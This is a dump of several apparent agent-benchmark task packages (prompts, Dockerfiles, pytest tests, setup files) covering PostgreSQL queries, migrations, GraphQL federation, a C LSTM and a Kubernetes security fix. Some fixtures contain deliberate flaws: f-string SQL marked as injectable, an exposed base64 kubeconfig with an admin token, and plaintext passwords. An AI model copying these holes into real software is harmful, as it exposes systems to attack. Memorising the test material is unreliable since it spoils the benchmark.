  \n    for migration in migrations:\n        # Check if already applied (vulnerable to SQL injection)\n        check_sql = f\""SELECT 1 FROM migrations WHERE filename = '{migration}'\""\n        cursor.execute(check_sql)\n        \n        if not cursor.fetchone():\n            run_migration(conn, migration, os.getenv('TABLE_SUFFIX'))\n            \n            # Record migration (vulnerable)\n            record_sql = f\""INSERT INTO migrations (filename) VALUES ('{migration}')\""\n            cursor.execute(record_sql)\n            conn.commit()\n    \n    conn.close()\n    print(\""All migrations completed!\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-22T15:08:52.116247+00:00,2025-07-22T15:11:46.787509+00:00
draft_dp_c8108e6e,medium,draft_dp_c8108e6e,debugging,Analytics queries failing after PostgreSQL upgrade. Fix the JSON operator syntax in queries/ directory - some are using old casting methods that don't work in v14.,debugging,debugging|python|data,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y \
    postgresql \
    postgresql-client \
    gcc \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy application files
COPY app.py /app/
COPY requirements.txt /app/
COPY init_db.sql /app/
COPY queries/ /app/queries/
COPY expected_results/ /app/expected_results/

# Install Python dependencies
RUN pip install -r requirements.txt

# Initialize PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    createdb analytics && \
    psql analytics < /app/init_db.sql && \
    /etc/init.d/postgresql stop

USER root
WORKDIR /app","import subprocess
import os
import json
import psycopg2

def test_queries_execute_successfully():
    """"""Test that all queries execute without errors.""""""
    # Start PostgreSQL
    subprocess.run([""/etc/init.d/postgresql"", ""start""], check=True, capture_output=True)
    
    # Run the app which executes all queries
    result = subprocess.run(
        [""python"", ""/app/app.py""],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""App failed: {result.stderr}""
    assert ""All queries executed successfully!"" in result.stdout

def test_query_results_match_expected():
    """"""Test that query results match expected outputs.""""""
    # Start PostgreSQL
    subprocess.run([""/etc/init.d/postgresql"", ""start""], check=True, capture_output=True)
    
    conn = psycopg2.connect(dbname=""analytics"", user=""postgres"", host=""localhost"")
    
    queries_dir = ""/app/queries""
    expected_dir = ""/app/expected_results""
    
    for query_file in [""01_product_prices.sql"", ""02_nested_specs.sql"", ""03_order_totals.sql""]:
        # Read and execute query
        with open(os.path.join(queries_dir, query_file), 'r') as f:
            query = f.read()
        
        cur = conn.cursor()
        cur.execute(query)
        results = cur.fetchall()
        cur.close()
        
        # Load expected results
        expected_file = query_file.replace('.sql', '.json')
        with open(os.path.join(expected_dir, expected_file), 'r') as f:
            expected = json.load(f)
        
        # Compare results
        assert len(results) == len(expected), f""Row count mismatch for {query_file}""
        
        for i, (actual, exp) in enumerate(zip(results, expected)):
            assert len(actual) == len(exp), f""Column count mismatch in {query_file} row {i}""
            for j, (a, e) in enumerate(zip(actual, exp)):
                # Handle numeric comparisons
                if isinstance(e, (int, float)) and isinstance(a, (int, float)):
                    assert abs(a - e) < 0.01, f""Value mismatch in {query_file} row {i} col {j}""
                else:
                    assert str(a) == str(e), f""Value mismatch in {query_file} row {i} col {j}""
    
    conn.close()","{""test_queries_execute_successfully"": 0.4, ""test_query_results_match_expected"": 0.6}","{""init_db.sql"": ""-- Create tables with JSONB data\nCREATE TABLE IF NOT EXISTS products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(100),\n    details JSONB\n);\n\nCREATE TABLE IF NOT EXISTS orders (\n    id SERIAL PRIMARY KEY,\n    order_data JSONB,\n    created_at TIMESTAMP DEFAULT NOW()\n);\n\n-- Insert sample data\nINSERT INTO products (name, details) VALUES\n    ('Laptop', '{\""price\"": 999.99, \""specs\"": {\""ram\"": \""16GB\"", \""cpu\"": \""i7\"", \""storage\"": {\""type\"": \""SSD\"", \""size\"": \""512GB\""}}}'),\n    ('Mouse', '{\""price\"": 29.99, \""specs\"": {\""type\"": \""wireless\"", \""dpi\"": 1600}}'),\n    ('Keyboard', '{\""price\"": 79.99, \""specs\"": {\""type\"": \""mechanical\"", \""switches\"": \""blue\"", \""backlight\"": true}}'),\n    ('Monitor', '{\""price\"": 399.99, \""specs\"": {\""size\"": \""27\\\""\"", \""resolution\"": \""4K\"", \""refresh\"": 144}}');\n\nINSERT INTO orders (order_data) VALUES\n    ('{\""customer\"": \""John Doe\"", \""items\"": [{\""product_id\"": 1, \""quantity\"": 1}, {\""product_id\"": 2, \""quantity\"": 2}], \""total\"": 1059.97}'),\n    ('{\""customer\"": \""Jane Smith\"", \""items\"": [{\""product_id\"": 3, \""quantity\"": 1}], \""total\"": 79.99, \""discount\"": {\""code\"": \""SAVE10\"", \""amount\"": 8.00}}'),\n    ('{\""customer\"": \""Bob Wilson\"", \""items\"": [{\""product_id\"": 4, \""quantity\"": 2}, {\""product_id\"": 2, \""quantity\"": 1}], \""total\"": 829.97}');"", ""requirements.txt"": ""psycopg2-binary==2.9.9"", ""app.py"": ""#!/usr/bin/env python3\nimport psycopg2\nimport json\nimport os\nimport sys\n\ndef connect_db():\n    return psycopg2.connect(\n        dbname=\""analytics\"",\n        user=\""postgres\"",\n        host=\""localhost\""\n    )\n\ndef run_query_file(conn, query_file):\n    with open(query_file, 'r') as f:\n        query = f.read()\n    \n    cur = conn.cursor()\n    try:\n        cur.execute(query)\n        results = cur.fetchall()\n        return results\n    except Exception as e:\n        print(f\""Error in {query_file}: {e}\"")\n        raise\n    finally:\n        cur.close()\n\ndef main():\n    # Start PostgreSQL\n    os.system(\""/etc/init.d/postgresql start\"")\n    \n    conn = connect_db()\n    \n    # Run all queries in queries/ directory\n    queries_dir = \""/app/queries\""\n    for query_file in sorted(os.listdir(queries_dir)):\n        if query_file.endswith('.sql'):\n            print(f\""Running {query_file}...\"")\n            try:\n                results = run_query_file(conn, os.path.join(queries_dir, query_file))\n                print(f\""  Success: {len(results)} rows\"")\n            except Exception as e:\n                print(f\""  Failed: {e}\"")\n                sys.exit(1)\n    \n    conn.close()\n    print(\""\\nAll queries executed successfully!\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""queries/02_nested_specs.sql"": ""-- Access nested JSON with problematic path syntax\nSELECT \n    name,\n    details#>'{specs,storage,type}' as storage_type,\n    details#>'{specs,storage,size}' as storage_size\nFROM products\nWHERE details->'specs' ? 'storage';"", ""queries/01_product_prices.sql"": ""-- Get products with price > 50 using old casting syntax\nSELECT \n    name,\n    details->>'price'::numeric as price\nFROM products\nWHERE (details->>'price')::numeric > 50\nORDER BY price DESC;"", ""queries/03_order_totals.sql"": ""-- Aggregate order totals with old array syntax\nSELECT \n    order_data->>'customer' as customer,\n    order_data->'total' as total,\n    jsonb_array_length(order_data->'items') as item_count\nFROM orders\nWHERE order_data->'total' > '100'::jsonb;"", ""expected_results/02_nested_specs.json"": ""[\n    [\""Laptop\"", \""\\\""SSD\\\""\"", \""\\\""512GB\\\""\""]\n]"", ""expected_results/01_product_prices.json"": ""[\n    [\""Laptop\"", 999.99],\n    [\""Monitor\"", 399.99],\n    [\""Keyboard\"", 79.99]\n]"", ""expected_results/03_order_totals.json"": ""[\n    [\""John Doe\"", 1059.97, 2],\n    [\""Bob Wilson\"", 829.97, 2]\n]""}",2025-07-22T15:04:53.153515+00:00,2025-07-22T15:07:21.911179+00:00
draft_dp_d9734a00,extremely_hard,draft_dp_d9734a00,security,The K8s deployment pipeline failed security audit. Fix the exposed kubeconfig in the GitHub workflow and the hardcoded database password in the Helm values file.,security,security|cloud|automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install PyYAML and curl
RUN pip install --no-cache-dir pyyaml && \
    apt-get update && apt-get install -y curl && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Install kubectl 
RUN curl -LO ""https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl"" && \
    chmod +x kubectl && mv kubectl /usr/local/bin/

# Install helm
RUN curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Copy the vulnerable deployment pipeline
COPY deploy-workflow.yml /workspace/deploy-workflow.yml
COPY helm-charts /workspace/helm-charts
COPY k8s-configs /workspace/k8s-configs","import os
import re
import yaml

def test_kubeconfig_secured():
    """"""Test that kubeconfig is not exposed in the GitHub workflow.""""""
    workflow_path = ""/workspace/deploy-workflow.yml""
    if not os.path.exists(workflow_path):
        # Check alternate locations
        workflow_path = ""/workspace/.github/workflows/deploy.yml""
    
    assert os.path.exists(workflow_path), ""Deploy workflow file should exist""
    
    with open(workflow_path, 'r') as f:
        content = f.read()
    
    # Check for base64 encoded kubeconfig patterns
    kubeconfig_patterns = [
        r'YXBpVmVyc2lvbjogdjE',  # ""apiVersion: v1"" in base64
        r'echo\s+[""\']?[A-Za-z0-9+/=]{50,}[""\']?\s*\|\s*base64\s+-d',  # echo base64 | base64 -d pattern
        r'kubeconfig.*base64',  # kubeconfig mentions with base64
    ]
    
    for pattern in kubeconfig_patterns:
        assert not re.search(pattern, content), f""Workflow should not contain exposed kubeconfig (pattern: {pattern})""
    
    # Should use secrets instead
    assert '${{ secrets.' in content or 'secrets.' in content, ""Workflow should use GitHub secrets for sensitive data""

def test_helm_values_secured():
    """"""Test that database password is not hardcoded in Helm values.""""""
    values_path = ""/workspace/helm-charts/api-service/values.yaml""
    assert os.path.exists(values_path), ""Helm values file should exist""
    
    with open(values_path, 'r') as f:
        values = yaml.safe_load(f)
    
    # Check that password is not hardcoded
    if 'database' in values and 'password' in values['database']:
        password = values['database']['password']
        # Password should be a reference to a secret, not a hardcoded value
        assert not password or password.startswith('{{') or password == '', \
            ""Database password should not be hardcoded in values.yaml""
    
    # Check deployment template uses secrets properly
    deployment_path = ""/workspace/helm-charts/api-service/templates/deployment.yaml""
    if os.path.exists(deployment_path):
        with open(deployment_path, 'r') as f:
            deployment = f.read()
        
        # Should reference a secret for DB_PASSWORD
        assert 'secretKeyRef' in deployment or 'valueFrom' in deployment, \
            ""Deployment should use Kubernetes secrets for database password""","{""test_kubeconfig_secured"": 0.5, ""test_helm_values_secured"": 0.5}","{""deploy-workflow.yml"": ""name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Configure kubectl\n        run: |\n          mkdir -p ~/.kube\n          # Exposed kubeconfig - base64 encoded but not encrypted\n          echo \""YXBpVmVyc2lvbjogdjEKY2x1c3RlcnM6Ci0gY2x1c3RlcjoKICAgIHNlcnZlcjogaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjCiAgICBjZXJ0aWZpY2F0ZS1hdXRob3JpdHktZGF0YTogTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTMHRMUzB0Q2sxSlNVSmtla05EUVZJeVowRjNTVUpCWjBsQ1FVUkJUa0puYTNGb2EybEhPWGN3UWtGUmMwWkJSRUZXVFZKTmQwVlJXVVJXVVZGRVJYZHdjbVJYU213S1kycEJaRkZVUWxSQ1owNVdTRkpOUWtGbU9WVlZRVXhDV0VGdWVFMVNWVEJPVVc5NFRXcG5NRTFxU1RCT1ZGRXhUVlJCZUU5RVJYcE5WRVYzVGxSWk1Bb3dXa1JKVVU1VVRYaFBSRWw2VFZSRmVrMVVRWGhPVkZrd1RrUkZNMDVVUlhsTlZFVjZUV3BCZVU5SVVqQmFRMGsyU1VWMFpscG5jM2RuWjBWRlFtZHZSd3BDWjBWRlFVUkJSRUZuVGtOQlVVZEJNVlZrUkdkUlYwSkNRWFJOVWtKVlMyWXdWM2RNY0hRelVtZGhZV3RLVERWUVJrNVRORXhQVEc1TE5UaEdaVk00Q2tzeGRGcHJjREJDU0VGSlFrRmxRVUpCVVVSQloyUkNaVUZxUWpoQ1owRkJRVUpCUWtKNGF6RTFUbGx3YjBOUVZuaFdha0pYTjNFMVZEaEJQVDBLTFMwdExTMUZUa1FnUTBWU1ZFbEdTVU5CVkVVdExTMHRMUW89CmNvbnRleHRzOgotIGNvbnRleHQ6CiAgICBjbHVzdGVyOiBwcm9kdWN0aW9uCiAgICB1c2VyOiBhZG1pbgogIG5hbWU6IHByb2QtY29udGV4dApjdXJyZW50LWNvbnRleHQ6IHByb2QtY29udGV4dApraW5kOiBDb25maWcKcHJlZmVyZW5jZXM6IHt9CnVzZXJzOgotIG5hbWU6IGFkbWluCiAgdXNlcjoKICAgIHRva2VuOiBleUpoYkdjaU9pSlNVekkxTmlJc0ltdHBaQ0k2SWpkZk1uaE9lbXhYY1hsUmRIUmZjWFpZY0hOdFExbEJVMHBRVTBsT09IcEhVbFJQYUhKQ05TMWZNbk1pZlEuZXlKcGMzTWlPaUpyZFdKbGNtNWxkR1Z6TDNObGNuWnBZMlZoWTJOdmRXNTBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5dVlXMWxjMkZqWlNJNkltUmxabUYxYkhRaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNXVZVzFsSWpvaVlXUnRhVzRpTENKcmRXSmxjbTFsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1MWFXUWlPaUkxT1dNeE5qZGhaUzB3TXpVeExUUmpPRE10T1RrNE9DMDNPV0ptWkRJNU5EaGlOamNpTENKemRXSWlPaUp6ZVhOMFpXMDZjMlZ5ZG1salpXRmpZMjkxYm5RNlpHVm1ZWFZzZERwaFpHMXBiaUo5Lk14bU9faGJ1WXhidWNjTWhKTHBQRGlBLV9POFR3MHJYUGRXMjR5X3o=\"" | base64 -d > ~/.kube/config\n      \n      - name: Deploy services\n        run: |\n          cd helm-charts/api-service\n          helm upgrade --install api-service . -f values.yaml"", ""k8s-configs/namespace.yaml"": ""apiVersion: v1\nkind: Namespace\nmetadata:\n  name: production"", ""helm-charts/api-service/Chart.yaml"": ""apiVersion: v2\nname: api-service\ndescription: API service for the application\ntype: application\nversion: 1.0.0\nappVersion: \""1.0\"""", ""helm-charts/api-service/values.yaml"": ""replicaCount: 2\n\nimage:\n  repository: api-service\n  tag: \""1.0.0\""\n  pullPolicy: IfNotPresent\n\nservice:\n  type: ClusterIP\n  port: 8080\n\ndatabase:\n  host: postgres.default.svc.cluster.local\n  port: 5432\n  name: apidb\n  user: apiuser\n  # SECURITY ISSUE: Hardcoded password in plain text\n  password: \""SuperSecret123!\""\n\nresources:\n  limits:\n    cpu: 500m\n    memory: 512Mi\n  requests:\n    cpu: 250m\n    memory: 256Mi"", ""helm-charts/api-service/templates/deployment.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: {{ .Release.Name }}\n  template:\n    metadata:\n      labels:\n        app: {{ .Release.Name }}\n    spec:\n      containers:\n      - name: api\n        image: \""{{ .Values.image.repository }}:{{ .Values.image.tag }}\""\n        ports:\n        - containerPort: 8080\n        env:\n        - name: DB_HOST\n          value: {{ .Values.database.host }}\n        - name: DB_PORT\n          value: \""{{ .Values.database.port }}\""\n        - name: DB_NAME\n          value: {{ .Values.database.name }}\n        - name: DB_USER\n          value: {{ .Values.database.user }}\n        - name: DB_PASSWORD\n          value: {{ .Values.database.password }}\n        resources:\n          {{- toYaml .Values.resources | nindent 10 }}""}",2025-07-22T15:17:29.310507+00:00,2025-07-22T15:30:42.765156+00:00
draft_dp_691a01da,extremely_hard,draft_dp_691a01da,software-engineering,The GraphQL services on ports 4001-4004 need to be federated into a single gateway on port 5000. Make it handle cross-service queries and partial failures gracefully.,software-engineering,api|python|web-server,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install fastapi uvicorn strawberry-graphql httpx pytest pytest-asyncio

COPY user_service.py /app/
COPY product_service.py /app/
COPY order_service.py /app/
COPY start_services.sh /app/

RUN chmod +x /app/start_services.sh

CMD [""/bin/bash""]","import subprocess
import time
import json
import requests

def test_gateway_responds_on_port_5000():
    """"""Test that the GraphQL gateway is running on port 5000""""""
    try:
        response = requests.post(
            ""http://localhost:5000/graphql"",
            json={""query"": ""{ __schema { queryType { name } } }""},
            timeout=5
        )
        assert response.status_code == 200
        data = response.json()
        assert ""data"" in data
        assert ""__schema"" in data[""data""]
    except:
        assert False, ""Gateway not responding on port 5000""

def test_federated_query_across_services():
    """"""Test that gateway can execute queries across multiple services""""""
    query = """"""
    {
        user(id: ""1"") {
            id
            name
            email
        }
        products {
            id
            name
            price
        }
        ordersByUser(userId: ""1"") {
            id
            total
            status
        }
    }
    """"""
    
    try:
        response = requests.post(
            ""http://localhost:5000/graphql"",
            json={""query"": query},
            timeout=5
        )
        assert response.status_code == 200
        data = response.json()
        assert ""data"" in data
        assert ""user"" in data[""data""]
        assert data[""data""][""user""][""name""] == ""Alice Johnson""
        assert ""products"" in data[""data""]
        assert len(data[""data""][""products""]) >= 3
        assert ""ordersByUser"" in data[""data""]
        assert len(data[""data""][""ordersByUser""]) >= 2
    except:
        assert False, ""Federated query failed""","{""test_gateway_responds_on_port_5000"": 0.3, ""test_federated_query_across_services"": 0.7}","{""order_service.py"": ""import uvicorn\nfrom fastapi import FastAPI\nfrom strawberry.fastapi import GraphQLRouter\nimport strawberry\nfrom typing import List, Optional\nfrom datetime import datetime\n\napp = FastAPI()\n\n@strawberry.type\nclass Order:\n    id: str\n    user_id: str\n    product_ids: List[str]\n    total: float\n    status: str\n    created_at: str\n\norders_db = [\n    Order(id=\""1001\"", user_id=\""1\"", product_ids=[\""101\"", \""102\""], total=1029.98, \n          status=\""completed\"", created_at=\""2024-01-15T10:30:00\""),\n    Order(id=\""1002\"", user_id=\""2\"", product_ids=[\""103\""], total=79.99, \n          status=\""pending\"", created_at=\""2024-01-16T14:20:00\""),\n    Order(id=\""1003\"", user_id=\""1\"", product_ids=[\""102\"", \""103\""], total=109.98, \n          status=\""shipped\"", created_at=\""2024-01-17T09:15:00\""),\n]\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def order(self, id: str) -> Optional[Order]:\n        return next((o for o in orders_db if o.id == id), None)\n    \n    @strawberry.field\n    def orders(self) -> List[Order]:\n        return orders_db\n    \n    @strawberry.field\n    def orders_by_user(self, user_id: str) -> List[Order]:\n        return [o for o in orders_db if o.user_id == user_id]\n\nschema = strawberry.Schema(query=Query)\ngraphql_app = GraphQLRouter(schema)\napp.include_router(graphql_app, prefix=\""/graphql\"")\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=4003)"", ""user_service.py"": ""import uvicorn\nfrom fastapi import FastAPI\nfrom strawberry.fastapi import GraphQLRouter\nimport strawberry\nfrom typing import List, Optional\n\napp = FastAPI()\n\n@strawberry.type\nclass User:\n    id: str\n    name: str\n    email: str\n\nusers_db = [\n    User(id=\""1\"", name=\""Alice Johnson\"", email=\""alice@example.com\""),\n    User(id=\""2\"", name=\""Bob Smith\"", email=\""bob@example.com\""),\n    User(id=\""3\"", name=\""Charlie Brown\"", email=\""charlie@example.com\""),\n]\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def user(self, id: str) -> Optional[User]:\n        return next((u for u in users_db if u.id == id), None)\n    \n    @strawberry.field\n    def users(self) -> List[User]:\n        return users_db\n\nschema = strawberry.Schema(query=Query)\ngraphql_app = GraphQLRouter(schema)\napp.include_router(graphql_app, prefix=\""/graphql\"")\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=4001)"", ""product_service.py"": ""import uvicorn\nfrom fastapi import FastAPI\nfrom strawberry.fastapi import GraphQLRouter\nimport strawberry\nfrom typing import List, Optional\n\napp = FastAPI()\n\n@strawberry.type\nclass Product:\n    id: str\n    name: str\n    price: float\n    inventory: int\n\nproducts_db = [\n    Product(id=\""101\"", name=\""Laptop\"", price=999.99, inventory=50),\n    Product(id=\""102\"", name=\""Mouse\"", price=29.99, inventory=200),\n    Product(id=\""103\"", name=\""Keyboard\"", price=79.99, inventory=150),\n]\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def product(self, id: str) -> Optional[Product]:\n        return next((p for p in products_db if p.id == id), None)\n    \n    @strawberry.field\n    def products(self) -> List[Product]:\n        return products_db\n\nschema = strawberry.Schema(query=Query)\ngraphql_app = GraphQLRouter(schema)\napp.include_router(graphql_app, prefix=\""/graphql\"")\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=4002)"", ""start_services.sh"": ""#!/bin/bash\n\necho \""Starting GraphQL microservices...\""\n\npython user_service.py &\necho \""User service started on port 4001\""\n\npython product_service.py &\necho \""Product service started on port 4002\""\n\npython order_service.py &\necho \""Order service started on port 4003\""\n\nsleep 3\necho \""All services started\""\n\nwait""}",2025-07-22T17:49:43.300998+00:00,2025-07-22T17:49:43.335209+00:00
draft_dp_85b3cd5b,extremely_hard,draft_dp_85b3cd5b,machine-learning,Build a tiny LSTM text generator in C that fits in a 3KB binary. Should load weights from model.dat and generate text from seed strings.,machine-learning,C|optimization|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install build tools
RUN apt-get update && apt-get install -y \
    gcc \
    make \
    python3 \
    python3-numpy \
    && rm -rf /var/lib/apt/lists/*

# Copy files
COPY generate_model.py /app/
COPY sample.txt /app/

# Generate the pre-trained model
RUN python3 generate_model.py

# Create a basic Makefile
RUN echo 'CC=gcc' > Makefile && \
    echo 'CFLAGS=-Os -Wall -s' >> Makefile && \
    echo 'lstm: lstm.c' >> Makefile && \
    echo '\t$(CC) $(CFLAGS) -o lstm lstm.c -lm' >> Makefile && \
    echo '\tstrip -s lstm' >> Makefile && \
    echo 'clean:' >> Makefile && \
    echo '\trm -f lstm' >> Makefile","import os
import subprocess

def test_binary_size_under_3kb():
    """"""Test that the compiled LSTM binary is under 3KB.""""""
    # Check if binary exists
    assert os.path.exists('/app/lstm'), ""lstm binary not found""
    
    # Get file size
    size = os.path.getsize('/app/lstm')
    assert size < 3072, f""Binary size {size} bytes exceeds 3KB limit""

def test_text_generation():
    """"""Test that the LSTM can generate text from a seed string.""""""
    # Run the generator with a seed
    result = subprocess.run(
        ['/app/lstm', 'the'],
        capture_output=True,
        text=True,
        timeout=5
    )
    
    # Check it ran successfully
    assert result.returncode == 0, f""lstm failed with return code {result.returncode}""
    
    # Check output is generated (at least 10 chars beyond seed)
    output = result.stdout.strip()
    assert len(output) >= 10, f""Generated text too short: '{output}'""
    
    # Check output contains valid characters from vocabulary
    valid_chars = set('abcdefghijklmnopqrstuvwxyz .')
    assert all(c in valid_chars for c in output), f""Invalid characters in output: '{output}'""","{""test_binary_size_under_3kb"": 0.4, ""test_text_generation"": 0.6}","{""generate_model.py"": ""#!/usr/bin/env python3\n\""\""\""Generate a tiny pre-trained LSTM model for character-level text generation.\""\""\""\n\nimport struct\nimport numpy as np\n\n# Simple character vocabulary (lowercase + space + period)\nvocab = 'abcdefghijklmnopqrstuvwxyz .'\nvocab_size = len(vocab)\n\n# Tiny LSTM dimensions for 3KB constraint\nhidden_size = 16\nnum_layers = 1\n\n# Initialize weights with small random values\nnp.random.seed(42)\n\n# LSTM gates: input, forget, candidate, output\n# Weight matrices: W_ih (input to hidden) and W_hh (hidden to hidden)\n# Shape: [4 * hidden_size, input_size] and [4 * hidden_size, hidden_size]\nW_ih = np.random.randn(4 * hidden_size, vocab_size) * 0.1\nW_hh = np.random.randn(4 * hidden_size, hidden_size) * 0.1\nb_ih = np.random.randn(4 * hidden_size) * 0.01\nb_hh = np.random.randn(4 * hidden_size) * 0.01\n\n# Output layer\nW_out = np.random.randn(vocab_size, hidden_size) * 0.1\nb_out = np.random.randn(vocab_size) * 0.01\n\n# Quantize to int8 for size efficiency\ndef quantize(arr, scale=127.0):\n    return np.clip(np.round(arr * scale), -128, 127).astype(np.int8)\n\n# Quantize all weights\nscale = 50.0  # Scaling factor for quantization\nW_ih_q = quantize(W_ih, scale)\nW_hh_q = quantize(W_hh, scale)\nb_ih_q = quantize(b_ih, scale)\nb_hh_q = quantize(b_hh, scale)\nW_out_q = quantize(W_out, scale)\nb_out_q = quantize(b_out, scale)\n\n# Write to binary file\nwith open('model.dat', 'wb') as f:\n    # Header: magic number, version, dimensions\n    f.write(struct.pack('I', 0x4C53544D))  # 'LSTM' magic\n    f.write(struct.pack('B', 1))  # version\n    f.write(struct.pack('B', vocab_size))\n    f.write(struct.pack('B', hidden_size))\n    f.write(struct.pack('f', scale))  # quantization scale\n    \n    # Write vocabulary\n    f.write(vocab.encode('ascii'))\n    \n    # Write weights\n    f.write(W_ih_q.tobytes())\n    f.write(W_hh_q.tobytes())\n    f.write(b_ih_q.tobytes())\n    f.write(b_hh_q.tobytes())\n    f.write(W_out_q.tobytes())\n    f.write(b_out_q.tobytes())\n\nprint(f\""Model saved to model.dat\"")\nprint(f\""Vocab size: {vocab_size}, Hidden size: {hidden_size}\"")\nprint(f\""Total parameters: {W_ih_q.size + W_hh_q.size + b_ih_q.size + b_hh_q.size + W_out_q.size + b_out_q.size}\"")"", ""sample.txt"": ""the quick brown fox jumps over the lazy dog. the dog sleeps under the tree. the tree is tall and green.""}",2025-07-22T17:50:24.010530+00:00,2025-07-22T17:50:24.040733+00:00
draft_dp_f767a79d,hard,draft_dp_f767a79d,system-administration,Database migrations are failing with permission errors. Need to fix the script execution and database privileges so migrations can run successfully.,system-administration,python|debugging|sys-admin,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install PostgreSQL
RUN apt-get update && apt-get install -y \
    postgresql postgresql-contrib \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# Install Python dependencies
RUN pip install psycopg2-binary pytest

# Create app user and configure sudo
RUN useradd -m -s /bin/bash appuser && \
    echo 'appuser ALL=(ALL) NOPASSWD: /usr/sbin/service postgresql start' >> /etc/sudoers

# Setup PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    createdb appdb && \
    psql -c ""CREATE USER appuser WITH PASSWORD 'apppass';"" && \
    psql -c ""GRANT CONNECT ON DATABASE appdb TO appuser;"" && \
    psql appdb -c ""GRANT USAGE ON SCHEMA public TO appuser;"" && \
    psql appdb -c ""GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO appuser;""

USER root

# Create app directory structure
RUN mkdir -p /app/migrations /app/logs
WORKDIR /app

# Copy migration files with restrictive permissions
COPY 001_create_users_table.sql /app/migrations/
COPY 002_create_products_table.sql /app/migrations/
COPY 003_create_orders_table.sql /app/migrations/
COPY migrate.py /app/

# Set problematic permissions
RUN chown root:root /app/migrations/*.sql && \
    chmod 600 /app/migrations/*.sql && \
    chmod 700 /app/migrations && \
    chown root:root /app/migrate.py && \
    chmod 700 /app/migrate.py && \
    chown appuser:appuser /app/logs

# Set environment variables
ENV DB_HOST=localhost \
    DB_PORT=5432 \
    DB_NAME=appdb \
    DB_USER=appuser \
    DB_PASS=apppass

# Final setup before switching to appuser
USER root

# Create test runner script
RUN mkdir -p /tests && \
    echo '#!/bin/bash' > /tests/run-tests.sh && \
    echo 'cd /app' >> /tests/run-tests.sh && \
    echo 'python -m pytest /tests/tests.py -v' >> /tests/run-tests.sh && \
    chmod +x /tests/run-tests.sh

# Switch to appuser
USER appuser
WORKDIR /app

# Start PostgreSQL in the background
CMD sudo service postgresql start && sleep 2 && bash","import subprocess
import os

def test_migrations_execute_successfully():
    """"""Test that all migrations run without permission errors""""""
    # Try to run the migration script
    result = subprocess.run(
        ['python3', '/app/migrate.py'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    # Should succeed (exit code 0)
    assert result.returncode == 0, f""Migration failed with: {result.stderr}""
    
    # Check that all three migrations were completed
    assert ""Completed: 001_create_users_table.sql"" in result.stdout
    assert ""Completed: 002_create_products_table.sql"" in result.stdout
    assert ""Completed: 003_create_orders_table.sql"" in result.stdout
    assert ""All migrations completed successfully!"" in result.stdout

def test_database_schema_created():
    """"""Test that the expected tables were created in the database""""""
    # Check if tables exist using psql
    check_tables_cmd = """"""
    PGPASSWORD=apppass psql -h localhost -U appuser -d appdb -t -c ""
    SELECT table_name FROM information_schema.tables 
    WHERE table_schema = 'public' 
    AND table_type = 'BASE TABLE'
    ORDER BY table_name;""
    """"""
    
    result = subprocess.run(
        check_tables_cmd,
        shell=True,
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Failed to query database: {result.stderr}""
    
    # Check that all expected tables exist
    tables = result.stdout.strip().split('\n')
    tables = [t.strip() for t in tables if t.strip()]
    
    assert 'users' in tables, ""users table not found""
    assert 'products' in tables, ""products table not found""
